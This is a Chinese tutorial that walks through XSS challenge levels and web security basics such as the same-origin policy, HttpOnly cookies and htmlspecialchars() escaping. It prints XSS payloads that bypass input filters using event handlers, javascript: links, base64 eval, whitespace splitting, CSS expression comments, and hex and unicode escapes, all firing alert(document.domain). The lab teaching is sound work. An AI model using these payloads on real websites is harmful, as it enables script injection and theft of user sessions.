<p>提交信息，页面弹出弹框，说明成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413112410445.png" alt="image-20200413112410445"></p>
<p>点击确定返回Congratulations!! ，通关成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413112542216.png" alt="image-20200413112542216"></p>
<h4 id="HTML事件中的XSS"><a href="#HTML事件中的XSS" class="headerlink" title="HTML事件中的XSS"></a>HTML事件中的XSS</h4><h5 id="1、HTML事件介绍"><a href="#1、HTML事件介绍" class="headerlink" title="1、HTML事件介绍"></a>1、HTML事件介绍</h5><p>在现代浏览器中都内置大量的事件处理器。这些处理器会监事特定的条件或用户行为，例如鼠标单击，或浏览器窗口中完成加载某个图案。用过是用JavaScript，可以将某些特定的事件处理器作为属性添加给特定的标签，并可以在事件发生时执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413133315239.png" alt="image-20200413133315239"></p>
<h5 id="2、XSS漏洞发现"><a href="#2、XSS漏洞发现" class="headerlink" title="2、XSS漏洞发现"></a>2、XSS漏洞发现</h5><p>说白了是随便打，F12能找到就行</p>
<p>设置独一无二字符串提交，在响应中寻找</p>
<p>随便输入字符，F12使用左上角箭头选择输入框，找到你输入的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413133620268.png" alt="image-20200413133620268"></p>
<h5 id="3、闭合思路分析"><a href="#3、闭合思路分析" class="headerlink" title="3、闭合思路分析"></a>3、闭合思路分析</h5><p>我们可以发现，输入的XSS被当做字符串输出了，当做字符串输入就不会触发xss弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413135406234.png" alt="image-20200413135406234"></p>
<p>我们要通过HTML实践来触发XSS<code>&quot;onmouseover=&quot;alert(document.domain)</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413135708936.png" alt="image-20200413135708936"></p>
<p>提交，成功执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413135729704.png" alt="image-20200413135729704"></p>
<h5 id="4、Payload触发XSS漏洞-1"><a href="#4、Payload触发XSS漏洞-1" class="headerlink" title="4、Payload触发XSS漏洞"></a>4、Payload触发XSS漏洞</h5><p>当然不止onmouseover这一种事件，在本关开头图片上的事件可以每个都尝试一下，这里在使用一次<code>onclick</code>来进行XSS</p>
<p>进行提交</p>
<p><code>&quot;onclick=&quot;alert(document.domain);</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413141408260.png" alt="image-20200413141408260"></p>
<p>提交之后单击输入框，就可以弹出XSS</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413141505272.png" alt="image-20200413141505272"></p>
<h4 id="空格分隔属性的XSS"><a href="#空格分隔属性的XSS" class="headerlink" title="空格分隔属性的XSS"></a>空格分隔属性的XSS</h4><h5 id="1、XSS探测"><a href="#1、XSS探测" class="headerlink" title="1、XSS探测"></a>1、XSS探测</h5><p>空格分隔属性探测</p>
<p>构造第一无二的字符串，F12找到</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413143908401.png" alt="image-20200413143908401"></p>
<p>当我们使用之前的方法闭合是没有用的，我们尝试一下使用空格分隔</p>
<p>当输入<code>111 2222</code>时，111在引号中，2222却在引号外出现，这样我们就可以直接使用XSS了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413144534630.png" alt="image-20200413144534630"></p>
<h5 id="2、触发XSS"><a href="#2、触发XSS" class="headerlink" title="2、触发XSS"></a>2、触发XSS</h5><p>这里不能使用script，尖括号被转义了，所以使用事件来进行XSS</p>
<p>使用onclick或者其他的都可以，这里使用的onclick，onmouseover也可以，其他事件可以挨个尝试</p>
<p>输入内容的时候，会自动在等于号后加双引号。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413145621371.png" alt="image-20200413145621371"></p>
<p>这里直接输入 <code>111 onclick=clart(document.domain)</code>，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413145044448.png" alt="image-20200413145044448">这里直接输入 <code>111 onclick=clart(document.domain)</code>，</p>
<h4 id="javascript伪协议的XSS"><a href="#javascript伪协议的XSS" class="headerlink" title="javascript伪协议的XSS"></a>javascript伪协议的XSS</h4><h5 id="1、jacascript伪协议介绍"><a href="#1、jacascript伪协议介绍" class="headerlink" title="1、jacascript伪协议介绍"></a>1、jacascript伪协议介绍</h5><p>将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript后的URL中。这个特殊的协议类型声明了URL的主体是任意的javascript代码，他由javascript的解析其运行，如果javascript：URL中<code>javascript:var now = new Date();&quot;&lt;h1&gt;The time is:&lt;/h1&gt;&quot;+ now;</code></p>
<p>javascript URL还可以含有只执行动作，但不返回值的javascript语句。</p>
<p><code>javascript:alert(&quot;hello word!&quot;)</code></p>
<h5 id="2、XSS漏洞发现-1"><a href="#2、XSS漏洞发现-1" class="headerlink" title="2、XSS漏洞发现"></a>2、XSS漏洞发现</h5><p>设置独一无二字符串提交，在响应中寻找。</p>
<p>这里输出了特殊字符串，说明可能存在XSS漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413152406498.png" alt="image-20200413152406498"></p>
<h5 id="3、a链接标签属性href介绍"><a href="#3、a链接标签属性href介绍" class="headerlink" title="3、a链接标签属性href介绍"></a>3、a链接标签属性href介绍</h5><p> <code>&lt;a&gt;</code>标签定义超链接。</p>
<p><code>&lt;a&gt;</code>元素最用要的属性是<code>href</code>属性，它指定链接的目标。</p>
<h5 id="4、Payload触发XSS漏洞-2"><a href="#4、Payload触发XSS漏洞-2" class="headerlink" title="4、Payload触发XSS漏洞"></a>4、Payload触发XSS漏洞</h5><p>Payload：javascript:alert(document.domain)</p>
<p>将Payload输入到输入框并提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413153224582.png" alt="image-20200413153224582"></p>
<p>单击超链接，查看返回效果，成功弹出弹框，并返回了Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413153245648.png" alt="image-20200413153245648"></p>
<h5 id="因为第九关是UTF-7的编码形式，现在基本上浏览器已经移除了UTF-7编码了，所以想到达第10关就要作弊一下"><a href="#因为第九关是UTF-7的编码形式，现在基本上浏览器已经移除了UTF-7编码了，所以想到达第10关就要作弊一下" class="headerlink" title="因为第九关是UTF-7的编码形式，现在基本上浏览器已经移除了UTF-7编码了，所以想到达第10关就要作弊一下"></a>因为第九关是UTF-7的编码形式，现在基本上浏览器已经移除了UTF-7编码了，所以想到达第10关就要作弊一下</h5><h5 id="F12使用箭头选择红框那里的提示框，在id-”hide”后面加入XSS代码，鼠标放上去时弹出XSS，这样就绕过了第九关"><a href="#F12使用箭头选择红框那里的提示框，在id-”hide”后面加入XSS代码，鼠标放上去时弹出XSS，这样就绕过了第九关" class="headerlink" title="F12使用箭头选择红框那里的提示框，在id=”hide”后面加入XSS代码，鼠标放上去时弹出XSS，这样就绕过了第九关"></a>F12使用箭头选择红框那里的提示框，在id=”hide”后面加入XSS代码，鼠标放上去时弹出XSS，这样就绕过了第九关</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413193122104.png" alt="image-20200413193122104"></p>
<h4 id="绕过过滤domain为空的XSS"><a href="#绕过过滤domain为空的XSS" class="headerlink" title="绕过过滤domain为空的XSS"></a>绕过过滤domain为空的XSS</h4><h5 id="1、XSS漏洞发现"><a href="#1、XSS漏洞发现" class="headerlink" title="1、XSS漏洞发现"></a>1、XSS漏洞发现</h5><p>构造特殊无害字符串，响应中寻找字符串</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413193535545.png" alt="image-20200413193535545"></p>
<p>可以开到代码可以使用<code>&quot;&gt;</code>来闭合双引号和<code>&lt;input&gt;</code></p>
<p>按照之前的办法使用<code>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></p>
<p>查看返会结果，可以看到吧domain给替换成了空</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413193837927.png" alt="image-20200413193837927"></p>
<h5 id="2、绕过思考"><a href="#2、绕过思考" class="headerlink" title="2、绕过思考"></a>2、绕过思考</h5><p>寻找过滤内容，这里过滤的就是domain</p>
<p>绕过策略</p>
<ul>
<li>双写绕过</li>
<li>编码绕过</li>
</ul>
<h5 id="3、双写绕过"><a href="#3、双写绕过" class="headerlink" title="3、双写绕过"></a>3、双写绕过</h5><p>Payload：<code>&quot;&gt;&lt;script&gt;alert(document.dodomainmain)&lt;/script&gt;</code></p>
<p>复制Payload进行提交，页面成功弹窗。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413194654678.png" alt="image-20200413194654678"></p>
<p>返回了Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413194724423.png" alt="image-20200413194724423"></p>
<h5 id="4、编码绕过"><a href="#4、编码绕过" class="headerlink" title="4、编码绕过"></a>4、编码绕过</h5><p>eval函数是javascript当中经常用来执行字符串，这个字符串就会当做程序进行执行</p>
<p>atob函数是将加密的base64编码进行解码，转换成原来的字符</p>
<p>Payload：<code>&quot;&gt;&lt;script&gt;eval(atob(&#39;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&#39;));&lt;/script&gt;</code></p>
<p>这里进行加密的内容只有<code>alert(document.domain)</code></p>
<p>进行提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413195311101.png" alt="image-20200413195311101"></p>
<p>页面成功弹出弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413195353237.png" alt="image-20200413195353237"></p>
<p>查看页面返回信息</p>
<p>页面成功返回Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413195418479.png" alt="image-20200413195418479"></p>
<h4 id="绕过替换scrip和on事件的XSS"><a href="#绕过替换scrip和on事件的XSS" class="headerlink" title="绕过替换scrip和on事件的XSS"></a>绕过替换scrip和on事件的XSS</h4><h5 id="1、XSS漏洞发现-1"><a href="#1、XSS漏洞发现-1" class="headerlink" title="1、XSS漏洞发现"></a>1、XSS漏洞发现</h5><p>构造特殊无害字符串，响应中寻找字符串，随便打</p>
<p>在响应中查找输入的内容，发现了输入的字符串，由此就可能有XSS漏洞，是否存在需要我们具体探测。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414084954106.png" alt="image-20200414084954106"></p>
<h5 id="2、饶过思考"><a href="#2、饶过思考" class="headerlink" title="2、饶过思考"></a>2、饶过思考</h5><p>1、寻找过滤内容</p>
<p>文本框输入的onclick已经被过滤了onxxx，所以没有触发xss漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414085844194.png" alt="image-20200414085844194"></p>
<p>on事件被过滤后，我们尝试一下使用闭合inptu，使用script</p>
<p>可以看到script变成了xscript这样就导致页面无法弹出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414090353664.png" alt="image-20200414090353664"></p>
<h5 id="3、伪协议绕过"><a href="#3、伪协议绕过" class="headerlink" title="3、伪协议绕过"></a>3、伪协议绕过</h5><p>Payload：<code>&quot;&gt;&lt;a href=&quot;javascript:alert(document.domain)&quot;&gt;xss&lt;/a&gt;</code></p>
<p>发现javascript中的script变成了xscript，这样也没有办法弹出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414093328336.png" alt="image-20200414093328336"></p>
<h5 id="4、空格绕过"><a href="#4、空格绕过" class="headerlink" title="4、空格绕过"></a>4、空格绕过</h5><p>Payload：<code>&quot;&gt;&lt;a href=&quot;javascr      ipt:alert(document.domain);&quot;&gt;xss&lt;/a&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414095059130.png" alt="image-20200414095059130"></p>
<p>单击后面的xss超链接，成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414095153281.png" alt="image-20200414095153281"></p>
<p>返回了<strong>Congratulations!!</strong>，成功通关</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414095306986.png" alt="image-20200414095306986"></p>
<h4 id="利用IE特性绕过XSS过滤"><a href="#利用IE特性绕过XSS过滤" class="headerlink" title="利用IE特性绕过XSS过滤"></a>利用IE特性绕过XSS过滤</h4><h5 id="1、XSS漏洞发现-2"><a href="#1、XSS漏洞发现-2" class="headerlink" title="1、XSS漏洞发现"></a>1、XSS漏洞发现</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414140342524.png" alt="image-20200414140342524"></p>
<h5 id="2、基本XSS利用"><a href="#2、基本XSS利用" class="headerlink" title="2、基本XSS利用"></a>2、基本XSS利用</h5><p>HTML事件触发XSS</p>
<p>发现onclick在双引号当中，需要进行闭合</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414152038909.png" alt="image-20200414152038909"></p>
<p>发现输入的双引号并没有被闭合，而是双引号和去掉双引号后的空格被去掉了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414152200102.png" alt="image-20200414152200102"></p>
<p>测试之后使用script也被过滤了</p>
<h5 id="3、IE特性"><a href="#3、IE特性" class="headerlink" title="3、IE特性"></a>3、IE特性</h5><p>IE中两个反引号``可以闭合一个左边双引号</p>
<h5 id="4、Palyoad触发XSS"><a href="#4、Palyoad触发XSS" class="headerlink" title="4、Palyoad触发XSS"></a>4、Palyoad触发XSS</h5><p>Payload=``onclick=alert(document.domain)</p>
<p>编辑一个</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414162753350.png" alt="image-20200414162753350"></p>
<p>发现使用``成功将双引号闭合，执行了onclick</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414163018581.png" alt="image-20200414163018581"></p>
<p>点击输入框，弹出弹框说明成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414163213485.png" alt="image-20200414163213485"></p>
<p>成功返回Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414163234488.png" alt="image-20200414163234488"></p>
<h4 id="利用CSS特性触发XSS过滤"><a href="#利用CSS特性触发XSS过滤" class="headerlink" title="利用CSS特性触发XSS过滤"></a>利用CSS特性触发XSS过滤</h4><p>CSS层叠样式表</p>
<h5 id="1、XSS漏洞发现-3"><a href="#1、XSS漏洞发现-3" class="headerlink" title="1、XSS漏洞发现"></a>1、XSS漏洞发现</h5><p>构造特殊无害字符串，在响应中查找</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414165148387.png" alt="image-20200414165148387"></p>
<h5 id="2、基本XSS利用-1"><a href="#2、基本XSS利用-1" class="headerlink" title="2、基本XSS利用"></a>2、基本XSS利用</h5><p>因为是在属性中出现的字符串所以可以用事件触发XSS</p>
<p>利用HTML时间触发XSS</p>
<p>并没有当成Payload输出，而是当成字符串输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414165445847.png" alt="image-20200414165445847"></p>
<p>使用script发现也是当做字符串输出，我们看一发现引号颜色不一样，这样可以确定被进行了转义</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414165702242.png" alt="image-20200414165702242"></p>
<h5 id="3、CSS特性讲解"><a href="#3、CSS特性讲解" class="headerlink" title="3、CSS特性讲解"></a>3、CSS特性讲解</h5><p>background是设置背景颜色</p>
<p>指定一个url表名要加载一张图片</p>
<p>在加载图路径当中输入javascript伪协议执行JS。目前只有IE浏览器支持，其他浏览器已经不支持了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">background.url(&quot;javascript:alert(document.domain);&quot;);	设置背景颜色</span><br></pre></td></tr></table></figure>

<h5 id="4、Payload触发XSS"><a href="#4、Payload触发XSS" class="headerlink" title="4、Payload触发XSS"></a>4、Payload触发XSS</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">background-color:#f00;background.url(&quot;javascript:alert(document.domain);&quot;);  设置背景颜色</span><br></pre></td></tr></table></figure>

<p>IE11.0之后就不会执行该xss了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414210507320.png" alt="image-20200414210507320"></p>
<p>点击YES放行，成功弹出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414210533918.png" alt="image-20200414210533918"></p>
<h4 id="IE中利用CSS触发XSS"><a href="#IE中利用CSS触发XSS" class="headerlink" title="IE中利用CSS触发XSS"></a>IE中利用CSS触发XSS</h4><h5 id="1、CSS介绍"><a href="#1、CSS介绍" class="headerlink" title="1、CSS介绍"></a>1、CSS介绍</h5><p>层叠样式表(英文全称：Cascading Style Sheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。</p>
<h5 id="2、CSS中执行JS"><a href="#2、CSS中执行JS" class="headerlink" title="2、CSS中执行JS"></a>2、CSS中执行JS</h5><p>css expression(css表达式)又称Dynamic properties(动态属性)是早期微软DHTML的产物，以其可以在Css中定义表达式(公式)来达到建立元素间属性之间的联系等作用，从IE5开始得到支持，后因标准、性能、安全性等问题，微软从IE8 beta2标准模式开始，取消对css expression的支持。</p>
<p>实际应用</p>
<p>　　早期很多开发人员利用css expression实现了许多效果，比如将元素相对鼠标指针进行定位，根据一个定时器来移动元素等等。当然这些效果能够使用js来实现。</p>
<p>　　虽然css表达式问题很多，但是我们依然能够在网上看到它们的影子，甚至在一些成熟的商业网站上。最常见的一个应用就是悬浮在页面上的某个模块(比如导航、返回顶部)。</p>
<h5 id="3、注释绕过关键字过滤"><a href="#3、注释绕过关键字过滤" class="headerlink" title="3、注释绕过关键字过滤"></a>3、注释绕过关键字过滤</h5><p>CSS中的注释符/**/</p>
<p>绕过对关键字expression的过滤。ex/**/pression</p>
<h5 id="4、触发XSS"><a href="#4、触发XSS" class="headerlink" title="4、触发XSS"></a>4、触发XSS</h5><p>xss:                            随便的属性爱设置啥设置啥</p>
<p>expres/**/sion        进行注释绕过</p>
<p>window.x                  window获取全局窗口，x是没有定义这个x变量，这样会报错执行alert代码</p>
<p>Payload：xss:expres/**/sion(if(!window.x){alert(document.domain);window.x=1})</p>
<p>复制进行提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415100911703.png" alt="image-20200415100911703"></p>
<p>返回弹框，点击确定，返回Congratulations！！<img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415100943454.png" alt="image-20200415100943454"></p>
<h4 id="16进制绕过过滤触发XSS"><a href="#16进制绕过过滤触发XSS" class="headerlink" title="16进制绕过过滤触发XSS"></a>16进制绕过过滤触发XSS</h4><h5 id="1、16进制介绍"><a href="#1、16进制介绍" class="headerlink" title="1、16进制介绍"></a>1、16进制介绍</h5><p>十六进制转换有16进制每一位上可以是从小到大为：0-9、A-F。16个大小不同的数，即16进1，其中A-F（字母不区分大小写）这六个字母来分别表示10-15</p>
<p>使用python将字符串转换为16进制类型</p>
<p><code>\\x</code>将它输出为JS可以识别的16进制的写法</p>
<p><code>print(&quot;\\x&quot;+binascii.b2a_hex(s)</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415134518536.png" alt="image-20200415134518536"></p>
<h5 id="2、XSS挖掘"><a href="#2、XSS挖掘" class="headerlink" title="2、XSS挖掘"></a>2、XSS挖掘</h5><p>自己构造一个字符串</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415135051423.png" alt="image-20200415135051423"></p>
<h5 id="3、双斜杠-16进制绕过"><a href="#3、双斜杠-16进制绕过" class="headerlink" title="3、双斜杠+16进制绕过"></a>3、双斜杠+16进制绕过</h5><p>使用引号闭合等都不能将其闭合，还是当成字符串输出，可以看到，双引号颜色就不一样</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415135306740.png" alt="image-20200415135306740"></p>
<p>将尖括号进行转义，输入，这里不能使用单斜杠也就是<code>\x3c</code>会被转义，要是用双斜杠<code>\\x3c</code>这样才能正常输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415135813336.png" alt="image-20200415135813336"></p>
<h5 id="4、触发XSS-1"><a href="#4、触发XSS-1" class="headerlink" title="4、触发XSS"></a>4、触发XSS</h5><p>Payload：<code>\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</code></p>
<p>输入Payload，成功弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415140124310.png" alt="image-20200415140124310"></p>
<p>并且返回了Congratulations!! </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415140140261.png" alt="image-20200415140140261"></p>
<h4 id="unicode绕过过滤触发XSS"><a href="#unicode绕过过滤触发XSS" class="headerlink" title="unicode绕过过滤触发XSS"></a>unicode绕过过滤触发XSS</h4><h5 id="1、unicode介绍"><a href="#1、unicode介绍" class="headerlink" title="1、unicode介绍"></a>1、unicode介绍</h5><p>Unicode（统一码、万国码、单一码）是计算机科学领域里的一项业界标准，包括字符集、编码方案等。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。</p>
<p>使用py将字符串转换为Unicode类型</p>
<p>加双斜杠，单斜杠会被转义\u00就是JS能识别的Unicode编码</p>
<p><code>print &quot;\\u00&quot;+binascii.b2a_hex(&quot;&lt;&quot;)</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415175404676.png" alt="image-20200415175404676"></p>
<h5 id="2、XSS挖掘-1"><a href="#2、XSS挖掘-1" class="headerlink" title="2、XSS挖掘"></a>2、XSS挖掘</h5><p>构造一个字符串</p>
<p>输入之后被没有将其转换为尖括号，这样就不能使用16进制绕过了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415175524635.png" alt="image-20200415175524635"></p>
<h5 id="3、双斜杠-unicode绕过"><a href="#3、双斜杠-unicode绕过" class="headerlink" title="3、双斜杠+unicode绕过"></a>3、双斜杠+unicode绕过</h5><p>成功转换为了尖括号</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415175910063.png" alt="image-20200415175910063"></p>
<h5 id="4、触发XSS-2"><a href="#4、触发XSS-2" class="headerlink" title="4、触发XSS"></a>4、触发XSS</h5><p>Payload：<code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</code></p>
<p>复制Payload，输入提交成功弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415180212082.png" alt="image-20200415180212082"></p>
<h4 id="浏览器同源策略介绍"><a href="#浏览器同源策略介绍" class="headerlink" title="浏览器同源策略介绍"></a>浏览器同源策略介绍</h4><h5 id="1、源的含义"><a href="#1、源的含义" class="headerlink" title="1、源的含义"></a>1、源的含义</h5><p>源指源头，信息来源的位置。在计算机中源在RFC6454文档中规定，源是由协议，主机名，端口名组成。</p>
<p>范例：协议://主机名:端口号/</p>
<p>它们的协议不一样，所以不是同源</p>
<p>如：<a href="http://1.1.1.1:8080/" target="_blank" rel="noopener">http://1.1.1.1:8080/</a>    和    <a href="https://1.1.1.1:8080/" target="_blank" rel="noopener">https://1.1.1.1:8080/</a></p>
<h5 id="2、同源策略"><a href="#2、同源策略" class="headerlink" title="2、同源策略"></a>2、同源策略</h5><p>在计算机中，同源策略（Same origin policy，SOP）用于阻止一个非同源的页面恶意代码去访问另外一个非同源页面。</p>
<p>例如：源A–&gt;源B，如果两个的源不相同是不能进行直接通信的</p>
<p>只有两个页面属于同一个源才能互相访问。不同的源的客户端脚本在没有明确授权的情况下，不能读写对方资源。所以a.com下的JS脚本采用ajax读取b.com里面的文件数据是不会报错的 </p>
<p>例如：源A页面访问源B页面认证cookie，如果不加阻止读取cookie，会造成cookie欺骗绕过登录验证。</p>
<p>注意：同源一定要是协议、主机名、端口号完全一致</p>
<h5 id="3、IE源的特殊处理"><a href="#3、IE源的特殊处理" class="headerlink" title="3、IE源的特殊处理"></a>3、IE源的特殊处理</h5><p>1、位于可信域（Trust Zones）的互信的域名间，不受同源策略限制</p>
<p>2、IE在判断同源时不考虑端口。</p>
<p>可是通过document.domain读取或修改源。但是有限制，修改之后的源不能通过其他脚本再次修改。</p>
<h5 id="4、document-domain"><a href="#4、document-domain" class="headerlink" title="4、document.domain"></a>4、document.domain</h5><p>domain 属性可以解决因同源安全策略带来的不同文档的属性共享问题。降域document.domain同源策略认为域和子域属于不同的域，如：</p>
<p>child.a.com和a.com，</p>
<p>child.a1.com和child2.a.com</p>
<p>xxx.child1.a.com和child1.a.com</p>
<p>两两不同源，但可以通过设置document.domain=’a.com’，浏览器就会认为他们都是用一个源。想要实现以上任意两个页面之间的通信，两个页面必须都设置document.domain=’a.com’。</p>
<h4 id="cookie的httponly设置"><a href="#cookie的httponly设置" class="headerlink" title="cookie的httponly设置"></a>cookie的httponly设置</h4><h5 id="1、cookie介绍"><a href="#1、cookie介绍" class="headerlink" title="1、cookie介绍"></a>1、cookie介绍</h5><p>指某些网站为了辨别用户身份，进行了session跟踪而存储在用户本地终端上的数据（通常经过加密）。</p>
<p>cookie是在HTTP协议下，服务器或脚本可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户浏览器（客户端）上的小文本文件，他可以包含有关用户的信息。无论何时用户连接到服务器，web站点都可以访问cookie信息。</p>
<p>目前有些cookie是临时的，有些则是持续的。临时的cookie只在浏览器上保存一段规定的时间，一旦超过规定的时间，该cookie就会被系统清除。 </p>
<h5 id="2、cookie作用"><a href="#2、cookie作用" class="headerlink" title="2、cookie作用"></a>2、cookie作用</h5><p>cookie是存储在客户端上的一段小数据，浏览器（及客户端）通过HTTP协议和服务器端进行cookie交互，通常用材存储一些不敏感信息。</p>
<p>有时候cookie用于身份认证，这时候cookie信息很敏感</p>
<p>演示dvwa，sql注入利用，sqlmap测试</p>
<p>直接测试的话会进行302跳转，这样就没办法获取</p>
<p> <img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416101131762.png" alt="image-20200416101131762"></p>
<p>如果我们将登录后的cookie，加入的话，进行运行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416101232606.png" alt="image-20200416101232606"></p>
<p>成功返回数据库，这就是cookie身份验证时的作用</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416101257277.png" alt="image-20200416101257277"></p>
<h5 id="3、清除cookie"><a href="#3、清除cookie" class="headerlink" title="3、清除cookie"></a>3、清除cookie</h5><ul>
<li>通过浏览器工具清除cookie，打开Internet选项</li>
<li><img src="/2020/04/20/XSS/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200416101920286.png" alt="image-20200416101920286"></li>
<li>通过设置cookie的有效期来清除cookie；删除cookie可能会导致某些页面不能用。</li>
</ul>
<p>可以通过一些就是360，电脑管家等杀毒软件清除cookie</p>
<h5 id="4、cookie-httponly"><a href="#4、cookie-httponly" class="headerlink" title="4、cookie httponly"></a>4、cookie httponly</h5><p>setcookie(“abc”,”test”,NULL,NULL,NULL,NULL,TRUE);设置secure参数为true之后，就不能使用js获取cookie</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416105305914.png" alt="image-20200416105305914"></p>
<p>设置一个xss代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416111001365.png" alt="image-20200416111001365"></p>
<p>设置为true不能返回cookie</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416110923115.png" alt="image-20200416110923115"></p>
<p>设置为false，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416111051812.png" alt="image-20200416111051812"></p>
<p>发现弹出了内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416111119690.png" alt="image-20200416111119690"></p>
<h4 id="xss-filter过滤器介绍-防御"><a href="#xss-filter过滤器介绍-防御" class="headerlink" title="xss-filter过滤器介绍(防御)"></a>xss-filter过滤器介绍(防御)</h4><h5 id="1、htmlspecialchars-函数"><a href="#1、htmlspecialchars-函数" class="headerlink" title="1、htmlspecialchars()函数"></a>1、htmlspecialchars()函数</h5><p>htmlspecialchars()函数吧预定义的字符转换为HTML实体</p>
<p>预定义的字符是：</p>
<ul>
<li><code>&amp;</code>     (和号)         成为    <code>&amp;</code></li>
<li><code>&quot;</code>     (双引号)     成为    <code>&quot;</code></li>
<li><code>&#39;</code>     (单引号)     成为    <code>&#39;</code></li>
<li><code>&lt;</code>     (小于)         成为    <code>&lt;</code></li>
<li><code>&gt;</code>     (大于)         成为    <code>1</code></li>
</ul>
<p>htmlspecialchars(string,flags,character-set,double_encode)</p>
<p>参考链接：<a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp</a></p>
<p>编写一个简单的xss，使用htmlspecialchars()进行过滤</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416131647589.png" alt="image-20200416131647589"></p>
<p>在地址栏输入id值，返回了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416131716069.png" alt="image-20200416131716069"></p>
<p>改进代码，将scrip代码当做字符串，也就是实体输出，不会当成代码输出</p>
